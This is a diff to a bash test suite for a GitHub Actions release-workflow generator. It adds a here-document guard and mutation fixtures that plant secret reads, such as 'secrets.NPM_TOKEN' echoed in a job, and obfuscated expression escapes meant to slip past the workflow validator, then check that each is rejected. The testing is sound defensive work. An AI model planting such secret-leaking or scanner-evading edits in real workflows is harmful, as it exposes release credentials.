@@ -102,7 +102,7 @@ capture_mode() {
     mode_capture_failures=$((mode_capture_failures + 1))
     return
   }
-  out="$(bash "$gen" "$@" 2>"$err")" || status=$?
+  out="$(bash "${capture_gen:-$gen}" "$@" 2>"$err")" || status=$?
   if [ "$status" -ne 0 ]; then
     # Bounded: a verbose mode's stderr is unbounded, and one verdict line that scrolls the
     # named cause off the top defeats the point of naming it.
@@ -112,6 +112,12 @@ capture_mode() {
     # An empty capture is never a fixture: an empty contract suite exits 0 and
     # turns every positive case into a pass (#1736).
     fail "generator mode '$mode' exited 0 but emitted nothing"
+    mode_capture_failures=$((mode_capture_failures + 1))
+  elif [ -s "$err" ]; then
+    # Bash reports a failed command substitution inside a here-document on
+    # stderr and carries on, so a mode that succeeded while saying anything
+    # rendered from a failure. A succeeding generator is silent.
+    fail "generator mode '$mode' exited 0 but wrote to stderr: $(tr '\n' ' ' <"$err" | cut -c1-500)"
     mode_capture_failures=$((mode_capture_failures + 1))
   fi
   rm -f "$err"
@@ -1145,6 +1151,109 @@ stray_titles="$(grep -oE "\^## [A-Za-z][^']*" "$emitted" | grep -vxE '\^## (Newe
   && pass "fragment assertions are derived from the tree, not named inline" \
   || fail "emitted test greps for literal fragment titles: $(tr '\n' ' ' <<<"$stray_titles")"
 
+# Bash expands a here-document's command substitutions and ignores their
+# status, so a generator function that failed inside one rendered a truncated
+# caller and the generator still exited 0. The generator now computes every
+# such value before its here-document and returns on failure; these assertions
+# keep it that way and prove a failure is fatal.
+heredoc_guard="$tmproot/heredoc-substitutions.py"
+cat >"$heredoc_guard" <<'PY'
+"""Print each command substitution inside an unquoted here-document."""
+import re
+import sys
+
+# `<<` but not a `<<<` here-string; every opener on a line queues a body.
+OPENER = re.compile(r"(?<!<)<<(?!<)(-?)[ \t]*(['\"]?)([A-Za-z_][A-Za-z0-9_]*)\2")
+
+
+def live_substitutions(line):
+    """`$(` or a backtick preceded by an even number of backslashes."""
+    for match in re.finditer(r"\$\(|`", line):
+        backslashes = len(line[:match.start()]) - len(line[:match.start()].rstrip("\\"))
+        if backslashes % 2 == 0:
+            yield match.start()
+
+
+pending = []
+for number, line in enumerate(open(sys.argv[1], encoding="utf-8").read().split("\n"), 1):
+    if pending:
+        strip_tabs, quoted, delimiter = pending[0]
+        if (line.lstrip("\t") if strip_tabs else line) == delimiter:
+            pending.pop(0)
+            continue
+        if not quoted and any(True for _ in live_substitutions(line)):
+            print(f"{number}: {line.strip()[:100]}")
+        continue
+    for match in OPENER.finditer(line):
+        pending.append((match.group(1) == "-", match.group(2) != "", match.group(3)))
+PY
+heredoc_guard_case() {
+  # heredoc_guard_case <label> <expected findings> <file body>
+  local fixture="$tmproot/heredoc-guard-$1.sh" found
+  printf '%s\n' "$3" >"$fixture"
+  found="$(python3 "$heredoc_guard" "$fixture" | grep -c .)"
+  [ "$found" = "$2" ] \
+    && pass "the here-document guard reports $2 substitution(s) for $1" \
+    || fail "the here-document guard reported $found substitution(s) for $1, expected $2"
+}
+# shellcheck disable=SC2016 # each body is a fixture for the guard, never run
+{
+  heredoc_guard_case "an escaped substitution" 0 $'cat <<EOF\n\\$(not run)\nEOF'
+  heredoc_guard_case "a substitution behind an escaped backslash" 1 $'cat <<EOF\n\\\\$(run)\nEOF'
+  heredoc_guard_case "a here-string followed by a substitution" 1 $'grep -q x <<<ready\nz="$(run)"\ncat <<EOF\n$(run)\nEOF'
+  heredoc_guard_case "a tab-stripped terminator" 1 $'cat <<-EOF\n\tplain\n\tEOF\ncat <<\'Q\'\n$(quoted)\nQ\ncat <<EOF\n$(run)\nEOF'
+  heredoc_guard_case "two here-documents opened on one line" 2 $'cat <<\'A\' <<B\n$(quoted)\nA\n$(run)\nB\ncat <<EOF\n$(run)\nEOF'
+}
+heredoc_substitutions="$(python3 "$heredoc_guard" "$gen")"
+[ -z "$heredoc_substitutions" ] \
+  && pass "no unquoted here-document in the generator runs a command substitution" \
+  || fail "the generator runs command substitutions inside unquoted here-documents: $(tr '\n' ';' <<<"$heredoc_substitutions")"
+injected_generator_git_dir="$(git -C "$repo_root" rev-parse --absolute-git-dir)"
+inject_generator() {
+  # inject_generator <name> <function> <line>: a generator copy with <line> as
+  # the first command of <function>, run against this repository's objects.
+  local copy="$tmproot/injected-generators/$1/scripts/gen-changelog-caller.sh"
+  mkdir -p "$(dirname "$copy")"
+  python3 - "$gen" "$copy" "$2" "$3" <<'PY'
+import sys
+
+source, target, function, line = sys.argv[1:]
+text = open(source, encoding="utf-8").read()
+header = function + "() {\n"
+if text.count(header) != 1:
+    raise SystemExit("cannot inject into " + function)
+open(target, "w", encoding="utf-8").write(text.replace(header, header + line + "\n"))
+PY
+  printf '%s\n' "$copy"
+}
+while IFS='|' read -r injected_function injected_mode injected_args; do
+  injected_gen="$(inject_generator "fail-$injected_function-$injected_mode" "$injected_function" '  return 3')"
+  # shellcheck disable=SC2086 # the extra generator arguments are word-split on purpose
+  injected_out="$(GIT_DIR="$injected_generator_git_dir" bash "$injected_gen" "$injected_mode" "$sha" $injected_args 2>/dev/null)" \
+    && fail "the generator exited 0 when $injected_function failed inside $injected_mode" \
+    || { [ -z "$injected_out" ] \
+      && pass "a failing $injected_function stops $injected_mode with no output" \
+      || fail "a failing $injected_function stopped $injected_mode only after emitting output"; }
+done <<'INJECTIONS'
+release_snapshot_with|release-node|
+release_snapshot_job|release-snapshot|
+release_artifact_build_job_for|release-artifact|--build-runner ubuntu-24.04
+release_snapshot_job|contract-test|
+emit_verify_dependency_steps|release-node|
+INJECTIONS
+injected_warning_gen="$(inject_generator warning release_snapshot_with '  echo "injected rendering warning" >&2')"
+injected_warning_failures="$(
+  # A fresh count in a subshell: this case asserts that capture_mode FAILS.
+  # shellcheck disable=SC2034 # read by capture_mode
+  capture_gen="$injected_warning_gen" GIT_DIR="$injected_generator_git_dir"
+  export GIT_DIR
+  mode_capture_failures=0
+  capture_mode injected_warning_release release-node "$sha" >/dev/null
+  printf '%s' "$mode_capture_failures"
+)"
+[ "$injected_warning_failures" = 1 ] \
+  && pass "capture_mode refuses a generator mode that succeeded while writing to stderr" \
+  || fail "capture_mode accepted a generator mode that wrote to stderr (failures: ${injected_warning_failures:-none})"
 if generator_only_row; then
   [ "$fails" -eq 0 ] || exit 1
   echo "All generator contract assertions passed."
@@ -2338,6 +2447,490 @@ if needle not in snapshot:
 snapshot = snapshot.replace(needle, "      contents: write\n", 1)
 open(path, "w", encoding="utf-8").write(text[:start] + snapshot + text[end:])
 PY
+}
+
+# A credential guard that pipes a job block into `grep -q` under pipefail fails
+# open once the block outgrows the pipe: grep exits on its first match, the
+# still-writing producer dies of SIGPIPE, and the negated pipeline reads the
+# 141 as "no match". So the reference sits first and a MiB of ordinary YAML
+# follows it, far past the 64 KiB default pipe capacity, so the race is
+# deterministic.
+bury_credential_in_large_job() {
+  # bury_credential_in_large_job <adopter> <job-header> <anchor-line> <inserted-line>...
+  local workflow="$1/.github/workflows/release.yml"
+  shift
+  python3 - "$workflow" "$@" <<'PY'
+import sys
+
+path, job, anchor, *inserted = sys.argv[1:]
+lines = open(path, encoding="utf-8").read().splitlines(keepends=True)
+start = lines.index(job + "\n")
+at = lines.index(anchor + "\n", start) + 1
+indent = inserted[-1][: len(inserted[-1]) - len(inserted[-1].lstrip())]
+padding = [indent + "release_notes_preamble: |\n"]
+padding += [indent + "  " + "p" * 4096 + "\n" for _ in range(256)]
+lines[at:at] = [line + "\n" for line in inserted] + padding
+open(path, "w", encoding="utf-8").write("".join(lines))
+PY
+}
+forward_credential_from_large_snapshot() {
+  bury_credential_in_large_job "$1" "  snapshot:" "    with:" \
+    '      push_token: ${{ github.token }}'
+}
+leak_secret_into_large_build_job() {
+  bury_credential_in_large_job "$1" "  build:" "    timeout-minutes: 45" \
+    "    env:" '      LEAKED: ${{ secrets.RELEASE_APP_PRIVATE_KEY }}'
+}
+# A hand-edited caller changes the value of an input changelog-release.yml
+# declares. The snapshot job is pinned byte for byte to the generator's, so
+# every such edit is rejected by that pin, whatever the value spells; the
+# expression scan behind it is defense in depth, and the build job's scan is
+# exercised directly below.
+set_snapshot_input() {
+  # set_snapshot_input <adopter> <input> [replacement-line]...
+  python3 - "$1/.github/workflows/release.yml" "${@:2}" <<'PY'
+import sys
+
+path, key, *replacement = sys.argv[1:]
+lines = open(path, encoding="utf-8").read().splitlines(keepends=True)
+start = lines.index("  snapshot:\n")
+at = next(
+    index for index in range(start, len(lines))
+    if lines[index].startswith("      %s: " % key)
+)
+lines[at:at + 1] = [line + "\n" for line in replacement]
+open(path, "w", encoding="utf-8").write("".join(lines))
+PY
+}
+snapshot_input_index_token() {
+  set_snapshot_input "$1" component "      component: \${{ github['token'] }}"
+}
+snapshot_input_token_after_quoted_hash() {
+  set_snapshot_input "$1" component '      component: "x # ${{ github.token }}"'
+}
+snapshot_input_dotted_secret() {
+  set_snapshot_input "$1" component '      component: ${{ secrets.NPM_TOKEN }}'
+}
+snapshot_input_index_secret() {
+  set_snapshot_input "$1" component "      component: \${{ secrets['NPM_TOKEN'] }}"
+}
+snapshot_input_block_scalar_hash_line() {
+  set_snapshot_input "$1" component '      component: |' '        # ${{ github.token }}'
+}
+snapshot_input_hash_after_escaped_quote() {
+  set_snapshot_input "$1" component '      component: "\" # ${{ github.token }}"'
+}
+snapshot_input_multiline_quoted_hash_line() {
+  set_snapshot_input "$1" component '      component: "x' '        # ${{ github.token }}"'
+}
+snapshot_input_object_wildcard() {
+  set_snapshot_input "$1" component "      component: \${{ join(github.*, ',') }}"
+}
+snapshot_input_unverified_version() {
+  set_snapshot_input "$1" version '      version: ${{ inputs.version }}'
+}
+snapshot_input_suffixed_prefix() {
+  set_snapshot_input "$1" prefix '      prefix: ${{ inputs.prefix }}-rc'
+}
+snapshot_input_dropped() {
+  set_snapshot_input "$1" fragments
+}
+# The build job is scanned rather than pinned. A `#`-leading line inside a
+# block scalar is script text, not a comment, and an object filter over the
+# github context reads every property of it.
+build_heredoc_hash_line_token() {
+  python3 - "$1/.github/workflows/release.yml" <<'PY'
+import sys
+
+path = sys.argv[1]
+lines = open(path, encoding="utf-8").read().splitlines(keepends=True)
+at = lines.index("          mkdir -p release-artifacts\n", lines.index("  build:\n")) + 1
+lines[at:at] = [
+    "          cat >release-notes.txt <<'NOTES'\n",
+    "          # ${{ github.token }}\n",
+    "          NOTES\n",
+]
+open(path, "w", encoding="utf-8").write("".join(lines))
+PY
+}
+build_env_line() {
+  python3 - "$1/.github/workflows/release.yml" "$2" <<'PY'
+import sys
+
+path, entry = sys.argv[1:]
+lines = open(path, encoding="utf-8").read().splitlines(keepends=True)
+at = lines.index("    timeout-minutes: 45\n", lines.index("  build:\n")) + 1
+lines[at:at] = ["    env:\n", entry + "\n"]
+open(path, "w", encoding="utf-8").write("".join(lines))
+PY
+}
+build_env_object_wildcard() {
+  build_env_line "$1" "      RELEASE_CONTEXT: \${{ join(github.*, ',') }}"
+}
+# YAML decodes a double-quoted escape before Actions reads the value, so an
+# escape can spell an expression opener and context name no raw-text scan sees.
+build_env_escaped_expression() {
+  build_env_line "$1" '      RELEASE_CONTEXT: "\x24{{ toJSON(\x67ithub) }}"'
+}
+build_extra_action_step() {
+  python3 - "$1/.github/workflows/release.yml" <<'PY'
+import sys
+
+path = sys.argv[1]
+lines = open(path, encoding="utf-8").read().splitlines(keepends=True)
+at = lines.index("          mkdir -p release-artifacts\n", lines.index("  build:\n"))
+at = max(index for index in range(lines.index("  build:\n"), at) if lines[index].startswith("      - name: "))
+lines[at:at] = [
+    "      - name: Prepare the build\n",
+    "        uses: example/prepare-build@" + "0" * 40 + "\n",
+]
+open(path, "w", encoding="utf-8").write("".join(lines))
+PY
+}
+build_matrix_extra_key() {
+  python3 - "$1/.github/workflows/release.yml" <<'PY'
+import sys
+
+path = sys.argv[1]
+lines = open(path, encoding="utf-8").read().splitlines(keepends=True)
+at = lines.index("            dependency-index: 0\n", lines.index("  build:\n")) + 1
+lines[at:at] = ["            container: 'docker.io/example/builder'\n"]
+open(path, "w", encoding="utf-8").write("".join(lines))
+PY
+}
+snapshot_extra_field() {
+  python3 - "$1/.github/workflows/release.yml" <<'PY'
+import sys
+
+path = sys.argv[1]
+lines = open(path, encoding="utf-8").read().splitlines(keepends=True)
+at = lines.index("    secrets: inherit\n", lines.index("  snapshot:\n")) + 1
+lines[at:at] = ["    concurrency: release-snapshot\n"]
+open(path, "w", encoding="utf-8").write("".join(lines))
+PY
+}
+# A `#` line inside a block scalar is content, not a YAML comment, so the pin
+# compares it even though comments beside the generated wiring are allowed.
+build_run_body_hash_line() {
+  python3 - "$1/.github/workflows/release.yml" <<'PY'
+import sys
+
+path = sys.argv[1]
+lines = open(path, encoding="utf-8").read().splitlines(keepends=True)
+at = lines.index("          mkdir -p release-artifacts\n", lines.index("  build:\n")) + 1
+lines[at:at] = ["          # The release notes are built separately.\n"]
+open(path, "w", encoding="utf-8").write("".join(lines))
+PY
+}
+# The verify job is pinned step by step rather than whole, so a value it
+# accepts is read by the scan, and the scan refuses any scalar YAML would decode
+# into something other than its raw text.
+verify_metadata_env_line() {
+  python3 - "$1/.github/workflows/release.yml" "${@:2}" <<'PY'
+import sys
+
+path, *entries = sys.argv[1:]
+lines = open(path, encoding="utf-8").read().splitlines(keepends=True)
+start = lines.index("      - name: Prepare release package metadata\n", lines.index("  verify:\n"))
+at = lines.index("        env:\n", start) + 1
+lines[at:at] = [entry + "\n" for entry in entries]
+open(path, "w", encoding="utf-8").write("".join(lines))
+PY
+}
+verify_escaped_expression() {
+  verify_metadata_env_line "$1" '          RELEASE_CONTEXT: "\x24{{ toJSON(\x67ithub) }}"'
+}
+verify_quoted_scalar_behind_block_header() {
+  verify_metadata_env_line "$1" \
+    "          RELEASE_LABEL: ${2:-}\"release" \
+    '            notes: |' \
+    '              \x24{{ toJSON(\x67ithub) }}"'
+}
+# The emitted suite has no YAML parser, so the scanner refuses node properties
+# outright: a tag or anchor in front of a quote hid the quote from the earlier
+# scanner, which then took `notes: |` for a block scalar and skipped the escape.
+verify_tagged_quoted_scalar_behind_block_header() {
+  verify_quoted_scalar_behind_block_header "$1" '!!str '
+}
+verify_nonspecific_tagged_quoted_scalar_behind_block_header() {
+  verify_quoted_scalar_behind_block_header "$1" '! '
+}
+verify_verbatim_tagged_quoted_scalar_behind_block_header() {
+  verify_quoted_scalar_behind_block_header "$1" '!<tag:yaml.org,2002:str> '
+}
+verify_anchored_quoted_scalar_behind_block_header() {
+  verify_quoted_scalar_behind_block_header "$1" '&label '
+}
+# A doubled quote decodes to one, so the scan's reading of where an expression
+# ends differs from the expression Actions evaluates.
+verify_escaped_single_quote_expression() {
+  verify_metadata_env_line "$1" \
+    "          RELEASE_CONTEXT: '\${{ format(''}}'') || toJSON(secrets) }}'"
+}
+# str.splitlines() breaks at U+2028, which YAML 1.2 reads as text: the scanner
+# saw a block scalar header inside a comment, indented so the env entries below
+# it read as that scalar's body, and skipped the escape among them.
+verify_line_separator_in_comment() {
+  python3 - "$1/.github/workflows/release.yml" <<'PY'
+import sys
+
+path = sys.argv[1]
+lines = open(path, encoding="utf-8").read().splitlines(keepends=True)
+start = lines.index("      - name: Prepare release package metadata\n", lines.index("  verify:\n"))
+at = lines.index("        env:\n", start) + 1
+lines[at:at] = [
+    "          RELEASE_LABEL: release # note\u2028        notes: |\n",
+    '          RELEASE_CONTEXT: "\\x24{{ toJSON(\\x67ithub) }}"\n',
+]
+open(path, "w", encoding="utf-8").write("".join(lines))
+PY
+}
+# The generator writes each mode's whole job set. An extra job could select
+# the release environment or read any secret beside the pinned ones.
+add_release_job() {
+  python3 - "$1/.github/workflows/release.yml" "${@:2}" <<'PY'
+import sys
+
+path, *job = sys.argv[1:]
+lines = open(path, encoding="utf-8").read().splitlines(keepends=True)
+at = lines.index("  publish:\n")
+lines[at:at] = [line + "\n" for line in job] + ["\n"]
+open(path, "w", encoding="utf-8").write("".join(lines))
+PY
+}
+add_release_environment_job() {
+  add_release_job "$1" '  notes:' '    runs-on: ubuntu-24.04' '    environment: release-app' \
+    '    steps:' '      - run: echo notes'
+}
+add_secret_reading_job() {
+  add_release_job "$1" '  notes:' '    runs-on: ubuntu-24.04' '    steps:' \
+    '      - run: echo "${{ secrets.NPM_TOKEN }}"'
+}
+duplicate_snapshot_job() {
+  python3 - "$1/.github/workflows/release.yml" <<'PY'
+import sys
+
+path = sys.argv[1]
+lines = open(path, encoding="utf-8").read().splitlines(keepends=True)
+start = lines.index("  snapshot:\n")
+end = next(i for i in range(start + 1, len(lines)) if lines[i].startswith("  ") and not lines[i].startswith("   ") and lines[i].strip())
+lines[end:end] = lines[start:end]
+open(path, "w", encoding="utf-8").write("".join(lines))
+PY
+}
+publish_environment() {
+  python3 - "$1/.github/workflows/release.yml" <<'PY'
+import sys
+
+path = sys.argv[1]
+lines = open(path, encoding="utf-8").read().splitlines(keepends=True)
+at = lines.index("    timeout-minutes: 15\n", lines.index("  publish:\n")) + 1
+lines[at:at] = ["    environment: release-app\n"]
+open(path, "w", encoding="utf-8").write("".join(lines))
+PY
+}
+# A quote inside a comment opened an expression string in the raw-text scan,
+# and that string hid the live value on the next line. The scan now reads the
+# lines with comments blanked, and every scalar must close what it opens.
+verify_comment_carried_expression() {
+  verify_metadata_env_line "$1" \
+    "          # \${{ '" \
+    '          RELEASE_CONTEXT: ${{ secrets.NPM_TOKEN }}' \
+    "          # ' }}"
+}
+verify_trailing_comment_carried_expression() {
+  verify_metadata_env_line "$1" \
+    "          RELEASE_LABEL: release # \${{ '" \
+    '          RELEASE_CONTEXT: ${{ secrets.NPM_TOKEN }}' \
+    "          RELEASE_NOTE: none # ' }}"
+}
+# The same carry without a comment: one value leaves an expression string open
+# and a later value closes it, so the scan read the middle value as a string.
+verify_value_carried_expression() {
+  verify_metadata_env_line "$1" \
+    "          RELEASE_LABEL: \${{ 'release" \
+    '          RELEASE_CONTEXT: ${{ secrets.NPM_TOKEN }}' \
+    "          RELEASE_NOTE: none' }}"
+}
+# A key and its value are separate scalars, but on one line the scan read an
+# expression string opened in the key as running through the value, which
+# YAML decodes to a live secrets read. Only the mapping-key refusal sees it:
+# the line as a whole closes every expression it opens.
+verify_expression_in_mapping_key() {
+  verify_metadata_env_line "$1" \
+    "          \"RELEASE_NOTE \${{ '\": \"\${{ secrets.NPM_TOKEN }} '}}\""
+}
+verify_expression_in_flow_collection() {
+  verify_metadata_env_line "$1" \
+    "          RELEASE_LABELS: [\"\${{ 'a\", \"\${{ secrets.NPM_TOKEN }}\", \"' }}\"]"
+}
+build_comment_carried_expression() {
+  build_env_line "$1" "      # \${{ '"
+  python3 - "$1/.github/workflows/release.yml" <<'PY'
+import sys
+
+path = sys.argv[1]
+lines = open(path, encoding="utf-8").read().splitlines(keepends=True)
+at = lines.index("      # ${{ '\n", lines.index("  build:\n")) + 1
+lines[at:at] = ["      RELEASE_CONTEXT: ${{ secrets.NPM_TOKEN }}\n", "      # ' }}\n"]
+open(path, "w", encoding="utf-8").write("".join(lines))
+PY
+}
+# The workflow-scope scan read comment-stripped lines, but that strip treats a
+# quote in a plain scalar as opening a string and so keeps the comment after
+# it, whose expression string then hid the token read on the next line.
+workflow_scope_comment_carried_expression() {
+  python3 - "$1/.github/workflows/release.yml" <<'PY'
+import sys
+
+path = sys.argv[1]
+text = open(path, encoding="utf-8").read()
+old = "name: Release\nrun-name: Release ${{ inputs.version }} ${{ inputs.selector_digest || 'manual' }}\n"
+if text.count(old) != 1:
+    raise SystemExit("the release caller lost its name and run-name")
+text = text.replace(old, (
+    "name: Release it's # ${{ '\n"
+    "run-name: Release ${{ inputs.version }} ${{ inputs.selector_digest || 'manual' }} ${{ github.token }}\n"
+))
+open(path, "w", encoding="utf-8").write(text)
+PY
+}
+snapshot_comment_carried_expression() {
+  set_snapshot_input "$1" component \
+    "      # \${{ '" '      component: ${{ secrets.NPM_TOKEN }}' "      # ' }}"
+}
+# A quoted key after a sequence dash left the scanner's block scalar parent at
+# the dash, so the step's remaining keys read as the body of that empty scalar
+# and an escape among them was never refused. YAML decodes the env value below
+# to a live secrets read.
+verify_dash_quoted_key_block_header() {
+  python3 - "$1/.github/workflows/release.yml" <<'PY'
+import sys
+
+path = sys.argv[1]
+lines = open(path, encoding="utf-8").read().splitlines(keepends=True)
+at = lines.index("      - name: Prepare release package metadata\n", lines.index("  verify:\n"))
+if not (lines[at + 1].startswith("        if: ") and lines[at + 2] == "        env:\n"):
+    raise SystemExit("the metadata step lost its if and env lines")
+lines[at:at + 3] = [
+    '      - "if": |\n',
+    "        name: Prepare release package metadata\n",
+    "        env:\n",
+    '          RELEASE_CONTEXT: "\\x24{{ secrets.NPM_TOKEN }}"\n',
+]
+open(path, "w", encoding="utf-8").write("".join(lines))
+PY
+}
+# A block scalar header alone on its line took that line's column as the
+# scalar's parent. YAML indents the body past the key on the line above, so
+# the body line below read as structure and its `#` as a comment the scan
+# blanked, while YAML decodes it to a live secrets read.
+verify_block_header_on_own_line() {
+  python3 - "$1/.github/workflows/release.yml" <<'PY'
+import sys
+
+path = sys.argv[1]
+lines = open(path, encoding="utf-8").read().splitlines(keepends=True)
+start = lines.index("      - name: Prepare release package metadata\n", lines.index("  verify:\n"))
+at = lines.index("        env:\n", start)
+lines[at:at] = [
+    "        working-directory:\n",
+    "          >-\n",
+    "          . # ${{ secrets.NPM_TOKEN }}\n",
+]
+open(path, "w", encoding="utf-8").write("".join(lines))
+PY
+}
+# The open-expression check took text ending in `}}` for a closed expression,
+# but here those braces sit inside the string the scalar leaves open, so the
+# scan's string ran on through the secrets read below it.
+verify_open_string_ending_in_braces() {
+  python3 - "$1/.github/workflows/release.yml" <<'PY'
+import sys
+
+path = sys.argv[1]
+lines = open(path, encoding="utf-8").read().splitlines(keepends=True)
+start = lines.index("      - name: Prepare release package metadata\n", lines.index("  verify:\n"))
+at = lines.index("        env:\n", start)
+lines[at:at + 1] = [
+    "        working-directory: >-\n",
+    "          ${{ 'a }}\n",
+    "        env:\n",
+    "          RELEASE_CONTEXT: ${{ secrets.NPM_TOKEN }}\n",
+    "          RELEASE_TAIL: x' }}\n",
+]
+open(path, "w", encoding="utf-8").write("".join(lines))
+PY
+}
+# Workflow-level keys are the generator's set. A quoted or spaced `env` key
+# passed the literal `^env:` greps, and one placed after `jobs:` was outside
+# the lines the workflow-scope scan read, so a secret reached every job.
+add_top_level_entry() {
+  # add_top_level_entry <dir> <before-jobs|after-jobs> <line>...
+  python3 - "$1/.github/workflows/release.yml" "$2" "${@:3}" <<'PY'
+import sys
+
+path, where, *entry = sys.argv[1:]
+text = open(path, encoding="utf-8").read()
+block = "".join(line + "\n" for line in entry)
+if where == "before-jobs":
+    if text.count("\njobs:\n") != 1:
+        raise SystemExit("the release caller lost its jobs key")
+    text = text.replace("\njobs:\n", "\n" + block + "jobs:\n", 1)
+elif where == "after-jobs":
+    text = text.rstrip("\n") + "\n" + block
+else:
+    raise SystemExit("unknown position " + where)
+open(path, "w", encoding="utf-8").write(text)
+PY
+}
+# A generated top-level key moved after `jobs:` keeps the key set intact, so
+# only a scan of every line outside the jobs block sees the token read in it.
+move_run_name_after_jobs() {
+  python3 - "$1/.github/workflows/release.yml" <<'PY'
+import sys
+
+path = sys.argv[1]
+text = open(path, encoding="utf-8").read()
+old = "run-name: Release ${{ inputs.version }} ${{ inputs.selector_digest || 'manual' }}\n"
+if text.count(old) != 1:
+    raise SystemExit("the release caller lost its run-name")
+text = text.replace(old, "", 1).rstrip("\n") + "\n" + old.rstrip("\n") + " ${{ github.token }}\n"
+open(path, "w", encoding="utf-8").write(text)
+PY
+}
+# A step `if:` is evaluated as an expression with or without `${{ }}`, so the
+# context scan reads every `if:` value as expression code.
+verify_step_if() {
+  # verify_step_if <dir> <replacement line>...
+  python3 - "$1/.github/workflows/release.yml" "${@:2}" <<'PY'
+import sys
+
+path, *replacement = sys.argv[1:]
+lines = open(path, encoding="utf-8").read().splitlines(keepends=True)
+at = lines.index("      - name: Run dependency lifecycle scripts without credentials\n", lines.index("  verify:\n")) + 1
+if lines[at] != "        if: steps.release-version.outputs.selected == 'true'\n":
+    raise SystemExit("the lifecycle step lost its if line")
+lines[at:at + 1] = [line + "\n" for line in replacement]
+open(path, "w", encoding="utf-8").write("".join(lines))
+PY
+}
+# The publish job is generator-determined, so it is pinned whole. A substring
+# check of each `with:` input accepted a secret appended to a generated value.
+publish_with_input() {
+  # publish_with_input <dir> <generated line> <replacement line>
+  python3 - "$1/.github/workflows/release.yml" "$2" "$3" <<'PY'
+import sys
+
+path, old, new = sys.argv[1:]
+lines = open(path, encoding="utf-8").read().splitlines(keepends=True)
+at = lines.index(old + "\n", lines.index("  publish:\n"))
+lines[at] = new + "\n"
+open(path, "w", encoding="utf-8").write("".join(lines))
+PY
+}
+build_matrix_dependency_index_changed() {
+  sed -i 's/^            dependency-index: 0$/            dependency-index: 1/' "$1/.github/workflows/release.yml"
 }
 
 # #463/#464/#465. Each mutation below reproduces one defect the hand-copied
@@ -3756,6 +4349,398 @@ sync_last_rejection
 grep -qE 'snapshot forwards credentials|release-app environment' "$tmproot/run.out" \
   && pass "the broad-token rejection names the dedicated release App remedy" \
   || fail "the last credential case failed for some other reason: $(tail -2 "$tmproot/run.out")"
+
+# The cases above replace release_environment, so they are rejected before the
+# forwarding guard runs. These keep it and grow the job past a pipe's capacity:
+# a guard that pipes into an early-exit reader accepts both under pipefail.
+expect_rejection "a large snapshot job forwarding a credential before its padding" \
+  forward_credential_from_large_snapshot
+sync_last_rejection
+grep -qF 'snapshot forwards credentials instead of selecting its environment' "$tmproot/run.out" \
+  && pass "the snapshot forwarding guard holds for a job block larger than a pipe" \
+  || fail "a large credential-forwarding snapshot was not rejected by its forwarding guard: $(tail -2 "$tmproot/run.out")"
+expect_release_mode_rejection release-artifact \
+  "a large build job referencing a secret before its padding" \
+  leak_secret_into_large_build_job \
+  'build job references a secrets context; the build matrix runs adopter-owned scripts/release-build.sh'
+
+expect_rejection "a snapshot input carrying index-syntax token context access" snapshot_input_index_token
+sync_last_rejection
+grep -qF 'snapshot job is not the generated snapshot job (#784)' "$tmproot/run.out" \
+  && pass "the snapshot job pin rejects index-syntax token context access" \
+  || fail "a snapshot input carrying index-syntax token context access was not rejected by the snapshot job pin: $(tail -2 "$tmproot/run.out")"
+expect_rejection "a snapshot input carrying a token expression after a quoted #" snapshot_input_token_after_quoted_hash
+sync_last_rejection
+grep -qF 'snapshot job is not the generated snapshot job (#784)' "$tmproot/run.out" \
+  && pass "the snapshot job pin rejects a token expression after a quoted #" \
+  || fail "a snapshot input carrying a token expression after a quoted # was not rejected by the snapshot job pin: $(tail -2 "$tmproot/run.out")"
+expect_rejection "a snapshot input carrying dotted secrets context access" snapshot_input_dotted_secret
+sync_last_rejection
+grep -qF 'snapshot job is not the generated snapshot job (#784)' "$tmproot/run.out" \
+  && pass "the snapshot job pin rejects dotted secrets context access" \
+  || fail "a snapshot input carrying dotted secrets context access was not rejected by the snapshot job pin: $(tail -2 "$tmproot/run.out")"
+expect_rejection "a snapshot input carrying index-syntax secrets context access" snapshot_input_index_secret
+sync_last_rejection
+grep -qF 'snapshot job is not the generated snapshot job (#784)' "$tmproot/run.out" \
+  && pass "the snapshot job pin rejects index-syntax secrets context access" \
+  || fail "a snapshot input carrying index-syntax secrets context access was not rejected by the snapshot job pin: $(tail -2 "$tmproot/run.out")"
+expect_rejection "a snapshot input carrying a #-leading block scalar line carrying a token expression" snapshot_input_block_scalar_hash_line
+sync_last_rejection
+grep -qF 'snapshot job is not the generated snapshot job (#784)' "$tmproot/run.out" \
+  && pass "the snapshot job pin rejects a #-leading block scalar line carrying a token expression" \
+  || fail "a snapshot input carrying a #-leading block scalar line carrying a token expression was not rejected by the snapshot job pin: $(tail -2 "$tmproot/run.out")"
+expect_rejection "a snapshot input carrying a # after an escaped double quote" snapshot_input_hash_after_escaped_quote
+sync_last_rejection
+grep -qF 'snapshot job is not the generated snapshot job (#784)' "$tmproot/run.out" \
+  && pass "the snapshot job pin rejects a # after an escaped double quote" \
+  || fail "a snapshot input carrying a # after an escaped double quote was not rejected by the snapshot job pin: $(tail -2 "$tmproot/run.out")"
+expect_rejection "a snapshot input carrying a #-leading continuation of a multi-line quoted scalar" snapshot_input_multiline_quoted_hash_line
+sync_last_rejection
+grep -qF 'snapshot job is not the generated snapshot job (#784)' "$tmproot/run.out" \
+  && pass "the snapshot job pin rejects a #-leading continuation of a multi-line quoted scalar" \
+  || fail "a snapshot input carrying a #-leading continuation of a multi-line quoted scalar was not rejected by the snapshot job pin: $(tail -2 "$tmproot/run.out")"
+expect_rejection "a snapshot input carrying an object filter over the github context" snapshot_input_object_wildcard
+sync_last_rejection
+grep -qF 'snapshot job is not the generated snapshot job (#784)' "$tmproot/run.out" \
+  && pass "the snapshot job pin rejects an object filter over the github context" \
+  || fail "a snapshot input carrying an object filter over the github context was not rejected by the snapshot job pin: $(tail -2 "$tmproot/run.out")"
+expect_rejection "a snapshot input carrying an unverified dispatch version" snapshot_input_unverified_version
+sync_last_rejection
+grep -qF 'snapshot job is not the generated snapshot job (#784)' "$tmproot/run.out" \
+  && pass "the snapshot job pin rejects an unverified dispatch version" \
+  || fail "a snapshot input carrying an unverified dispatch version was not rejected by the snapshot job pin: $(tail -2 "$tmproot/run.out")"
+expect_rejection "a snapshot input carrying a prefix with text after the generated value" snapshot_input_suffixed_prefix
+sync_last_rejection
+grep -qF 'snapshot job is not the generated snapshot job (#784)' "$tmproot/run.out" \
+  && pass "the snapshot job pin rejects a prefix with text after the generated value" \
+  || fail "a snapshot input carrying a prefix with text after the generated value was not rejected by the snapshot job pin: $(tail -2 "$tmproot/run.out")"
